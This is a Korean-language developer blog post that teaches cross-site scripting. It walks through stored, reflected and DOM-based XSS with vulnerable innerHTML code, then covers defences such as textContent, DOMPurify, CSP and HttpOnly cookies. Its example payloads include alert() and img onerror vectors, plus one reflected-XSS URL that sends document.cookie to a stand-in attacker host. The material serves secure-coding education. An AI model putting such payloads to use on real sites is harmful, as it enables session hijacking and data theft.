---
layout: post
published: true
categories:
  - TIL
title: '웹 보안의 위협, XSS(Cross-site Scripting)'
tags:
  - TIL
  - Security
---

## 크로스 사이트 스크립팅(Cross-site Scripting, XSS)?

XSS은 공격자가 웹사이트에 **악의적인 스크립트를 삽입**하여 **다른 사용자의 웹 브라우저에서 실행**되도록 하는 웹 보안 취약점이다.  
이 공격을 통해 공격자는 사용자의 세션 쿠키, 개인정보 등을 탈취하거나, 웹사이트를 변조하고 악성 사이트로 사용자를 리디렉션하는 등 다양한 악의적인 행위를 할 수 있다.

---

## XSS 공격의 원리

XSS 공격은 웹 애플리케이션이 사용자로부터 입력받은 데이터를 **검증하거나 필터링하지 않고 그대로 페이지에 표시할 때 발생**한다.  
공격자는 이 허점을 이용하여 `<script>`와 같은 HTML 태그를 포함한 악성 스크립트를 게시글, 댓글, 검색어 등 사용자가 입력할 수 있는 모든 곳에 삽입한다. 이후, 다른 사용자가 해당 페이지를 열람하면 그들의 브라우저는 삽입된 스크립트를 **신뢰할 수 있는 웹사이트의 일부로 인식하고 실행**하게 된다.

---

## XSS 공격의 주요 유형

XSS 공격은 악성 스크립트가 저장되는 위치와 실행되는 방식에 따라 크게 세 가지 유형으로 나뉜다.

### 1. 저장형 XSS (Stored XSS)

저장형 XSS는 **가장 위험한 유형의 XSS 공격**이다. 공격자가 악성 스크립트를 **웹 서버의 데이터베이스나 파일 시스템에 영구적으로 저장**하고, 이후 이 스크립트가 불특정 다수의 사용자에게 실행되도록 유도하는 방식이다.

#### 📝 시나리오 예시

어떤 쇼핑몰의 **상품 후기 게시판**이 있다고 가정해보자. 사용자가 작성한 후기를 서버에 저장한 뒤, 다시 불러와서 웹 페이지에 출력하는 구조이다. 이때 후기를 출력할 때 **스크립트 필터링 없이 그대로 DOM에 삽입**할 경우, 저장형 XSS가 발생할 수 있다.

- **취약한 프론트엔드 코드 (Vanilla JS 예시)**

  ```js
  // 서버에서 가져온 후기 데이터를 받아 DOM에 삽입하는 코드
  fetch('/api/comments?id=123')
  	.then((res) => res.text())
  	.then((comment) => {
  		const container = document.getElementById('comment-section');
  		container.innerHTML = `<div>${comment}</div>`; // ⚠️ 위험한 코드
  	});
  ```

- **공격자가 삽입한 악성 스크립트 예시**

  ```html
  정말 좋은 상품이네요!
  <script>
  	alert('당신의 쿠키 정보가 탈취되었습니다!');
  </script>
  ```

- **공격 과정**

  1. 공격자가 위와 같은 악성 `<script>` 태그가 포함된 후기를 작성하면, 이 내용은 서버의 데이터베이스에 저장된다.
  2. 이후 일반 사용자가 후기 페이지에 접속하면, 위에서 보여준 JS 코드가 서버에서 해당 후기를 불러온다.
  3. `innerHTML`을 사용해 필터링 없이 DOM에 삽입되면서, `<script>`가 실행된다.
  4. 공격자의 스크립트가 실행되어 사용자의 브라우저에서 경고창이 뜬다. 실제 공격에서는 `document.cookie`를 탈취하거나 외부 서버로 전송하는 코드가 삽입될 수 있다.

  ```html
  <div>
  	정말 좋은 상품이네요!
  	<script>
  		alert('당신의 쿠키 정보가 탈취되었습니다!');
  	</script>
  </div>
  ```

#### ⚠️ 문제의 핵심

`innerHTML`을 통해 사용자 입력을 그대로 DOM에 삽입할 경우, 저장형 XSS에 취약해진다. 이는 자바스크립트 환경에서도 흔히 발생하는 실수이며, 서버에서 필터링되지 않은 데이터를 클라이언트에서 그대로 사용하면 이런 공격에 노출될 수 있다.

### 2. 반사형 XSS (Reflected XSS)

반사형 XSS는 악성 스크립트가 서버에 저장되지는 않지만, **사용자의 요청(Request)에 포함되어**, 서버의 응답(Response)에 그대로 **반사되어 브라우저에서 실행되는 방식**이다.

#### 📝 시나리오 예시

어떤 웹사이트에 **검색 기능**이 있다고 가정해보자. 사용자가 검색어를 입력하면, 해당 검색어를 페이지에 표시하면서 검색 결과를 보여주는 구조이다.

- **취약한 프론트엔드 코드 (Vanilla JS 예시)**

  ```js
  // URL의 query string에서 검색어(keyword)를 추출
  const params = new URLSearchParams(location.search);
  const keyword = params.get('keyword');

  // 검색어를 필터링 없이 DOM에 삽입
  const resultTitle = document.getElementById('result-title');
  resultTitle.innerHTML = `<h2>${keyword}에 대한 검색 결과</h2>`; // ⚠️ 위험한 코드
  ```

- **공격자가 만든 악성 URL**

  공격자는 `keyword` 파라미터에 스크립트를 삽입하여 아래와 같은 URL을 만든다.

  ```
  https://example.com/search?keyword=<script>document.location='http://hacker.com/steal?cookie='+document.cookie</script>
  ```

- **공격 과정**

  1. 공격자는 이메일, 메신저, 혹은 광고를 통해 위 URL을 사용자에게 전달한다.
  2. 사용자가 해당 링크를 클릭하면, 브라우저는 `keyword` 값에 스크립트를 담아 페이지를 로드한다.
  3. 페이지가 로드되면서 위의 JS 코드가 `location.search`에서 파라미터를 추출하고, `innerHTML`로 DOM에 삽입한다.
  4. 결과적으로 `<script>`가 실행되며, 사용자의 쿠키 정보가 외부 공격자 서버로 전송된다.

  ```html
  <h2>
  	<script>
  		document.location = 'http://hacker.com/steal?cookie=' + document.cookie;
  	</script>
  	에 대한 검색 결과
  </h2>
  ```

#### ⚠️ 문제의 핵심

- `innerHTML`을 통해 **쿼리 스트링의 값을 필터링 없이 DOM에 출력**하는 것이 핵심적인 취약점이다.
- 반사형 XSS는 서버에 저장되는 정보 없이 **즉시 실행**되므로, 탐지와 방어가 더 어렵다.

### 3. DOM 기반 XSS (DOM-based XSS)

DOM 기반 XSS는 **서버와의 통신 없이**, **브라우저에서 실행되는 자바스크립트 코드 내부에서 직접 발생하는 공격**이다.
서버는 전혀 관여하지 않기 때문에, 탐지 및 대응이 더 어려운 편이다.

#### 📝 시나리오 예시

어떤 웹사이트가 URL의 **해시(#) 값을 가져와 사용자에게 환영 메시지를 출력**하는 구조라고 가정해보자.
예를 들어, `example.com/#홍길동`으로 접속하면 “홍길동님, 환영합니다!” 라는 메시지를 보여주는 방식이다.

- **취약한 프론트엔드 코드 (Vanilla JS 예시)**

  ```html
  <div id="welcome"></div>

  <script>
  	// URL의 해시(#) 값에서 이름 추출
  	const name = decodeURIComponent(location.hash.slice(1));

  	// 이름을 HTML로 그대로 삽입 (⚠️ 매우 위험)
  	document.getElementById('welcome').innerHTML = `${name}님, 환영합니다!`;
  </script>
  ```

- **공격자가 만든 악성 URL**

  공격자는 해시 값에 악성 HTML을 삽입해 다음과 같은 URL을 만든다.

  ```
  http://example.com/#<img src=x onerror=alert('DOM XSS!')>
  ```

- **공격 과정**

  1. 공격자는 위 URL을 사용자에게 전달하고 클릭을 유도한다.
  2. 사용자가 해당 URL로 접속하면, 브라우저는 해시(#) 이후의 값을 `location.hash`를 통해 읽어들인다.
  3. 위 자바스크립트 코드는 해당 값을 필터링 없이 `innerHTML`로 삽입한다.
  4. 결과적으로 `<img src=x onerror=...>` 요소가 DOM에 삽입되고, 이미지 로딩 실패로 인해 `onerror` 이벤트가 실행되며 `alert('DOM XSS!')`가 동작한다.

  ```html
  <div id="welcome"><img src="x" onerror="alert('DOM XSS!')" />님, 환영합니다!</div>
  ```

#### ⚠️ 문제의 핵심

- DOM XSS는 서버 요청 없이도 발생하기 때문에 **서버 로그로는 추적이 불가능**하다.
- `innerHTML` 사용 시 사용자 입력을 그대로 넣으면 **HTML 해석**이 발생하고, 이로 인해 스크립트가 실행될 수 있다.

---

## XSS 공격을 방지하는 방법

### 1. `textContent`로 HTML 해석 방지하기

가장 기본적이면서도 강력한 방법은 `innerHTML` 대신 `textContent`를 사용하는 것이다.  
innerHTML은 문자열을 HTML로 파싱 및 렌더링하므로 스크립트 실행의 가능성이 있다. 그러나, `textContent`는 HTML을 파싱하지 않고 순수 텍스트로만 출력되므로, 스크립트 실행을 원천 차단할 수 있다.

```js
const name = decodeURIComponent(location.hash.slice(1));
document.getElementById('welcome').textContent = `${name}님, 환영합니다!`;
```

이렇게 작성하면 `<script>`나 `<img onerror=...>` 같은 태그도 단순 문자열로 처리되기 때문에, 악성 코드가 실행되지 않는다.

### 2. DOMPurify로 사용자 입력 클렌징하기

만약 `innerHTML`을 반드시 사용해야 한다면, [DOMPurify](https://github.com/cure53/DOMPurify) 같은 라이브러리를 사용해 입력값을 먼저 정화해야 한다. DOMPurify는 위험한 태그나 속성(`script`, `onerror`, `onclick` 등)을 자동으로 제거해준다.

```bash
npm install dompurify
```

```js
import DOMPurify from 'dompurify';

const dirtyInput = '<img src=x onerror=alert(1)>';
const cleanInput = DOMPurify.sanitize(dirtyInput);

document.getElementById('output').innerHTML = cleanInput;
```

DOMPurify는 보안성과 사용성이 뛰어나며 OWASP에서도 추천하는 방식으로, 클라이언트 환경에서 가장 많이 사용되는 XSS 방어 도구 중 하나다.

### 3. Content Security Policy(CSP) 적용하기

CSP는 브라우저가 **스크립트 실행 정책을 제한**할 수 있도록 도와주는 HTTP 응답 헤더다. 이 설정을 통해 외부 스크립트, 인라인 자바스크립트, 동적 `eval()` 등을 차단할 수 있다.

```
Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none';
```

이렇게 설정하면 `<script>alert(1)</script>` 같은 코드는 브라우저에서 차단되며, 스크립트 로딩도 `'self'` (자기 자신)로 제한된다.

### 4. `HttpOnly` 속성을 통한 쿠키 보호

XSS의 가장 큰 피해 중 하나는 **쿠키 탈취**이다. 이를 막기 위해 중요한 인증 쿠키에는 `HttpOnly` 속성을 반드시 설정해야 한다.

```
Set-Cookie: sessionId=abc123; HttpOnly; Secure; SameSite=Strict
```

- `HttpOnly`: 자바스크립트에서 `document.cookie`로 접근 불가능하게 만든다.
- `Secure`: HTTPS에서만 쿠키를 전송하도록 한다.
- `SameSite`: 다른 출처에서의 요청에 대해 쿠키를 제한한다.

이 속성을 사용하면, 공격자가 `document.cookie`를 통해 인증 정보를 탈취하는 것을 원천 차단할 수 있다.

### 5. 사용자 입력 검증과 서버-클라이언트 이중 방어 적용하기

XSS는 단순히 프론트엔드에서만 막는다고 해결되지 않는다. 서버와 클라이언트 모두에서 **이중 방어(In-depth Defense)** 체계를 갖추는 것이 안전하다.

- 서버에서는 `sanitize-html` 등을 사용해 필터링을 적용한다.

  ```js
  import sanitizeHtml from 'sanitize-html';

  const clean = sanitizeHtml(userInput, {
  	allowedTags: ['b', 'i', 'a'],
  	allowedAttributes: { a: ['href'] },
  });
  ```

- **입력 제한을 강화**한다. `<`, `>`, `"`, `'` 등의 특수문자를 제거하거나 이스케이프 처리한다.

  ```js
  function escapeHTML(str) {
  	return str
  		.replace(/&/g, '&amp;')
  		.replace(/</g, '&lt;')
  		.replace(/>/g, '&gt;')
  		.replace(/"/g, '&quot;')
  		.replace(/'/g, '&#39;');
  }
  ```

- **X-Frame-Options**, **X-XSS-Protection** 등의 보안 헤더도 함께 설정해주는 것이 좋다.

---

## 마무리

XSS는 프론트엔드 개발자라면 반드시 알고 있어야 할 보안 이슈다. 단 한 줄의 `innerHTML` 만으로도 사용자 정보가 탈취될 수 있으며, 기업 신뢰와 시스템 전체를 위협할 수 있다.

따라서 앞으로 개발할 때 아래와 같은 원칙을 습관화해야겠다. (아래 원칙은 GPT가 뽑아줬다. 참 맞는 말만 하는 듯)

> ❗ 사용자 입력은 절대 신뢰하지 않는다.  
> ❗ DOM에 삽입할 때는 반드시 정제하거나 이스케이프한다.  
> ❗ 서버와 클라이언트 양쪽에서 모두 방어 로직을 구성한다.

이런 보안 습관은 나와 사용자 모두를 안전하게 지켜주는 강력한 무기가 되어줄 것으로 기대된다!

## 📚 참고

- 도서: 프런트엔드 개발을 위한 보안입문
- [MDN Web Docs: 크로스 사이트 스크립팅 (Cross-site scripting (XSS))](https://developer.mozilla.org/ko/docs/Glossary/Cross-site_scripting)
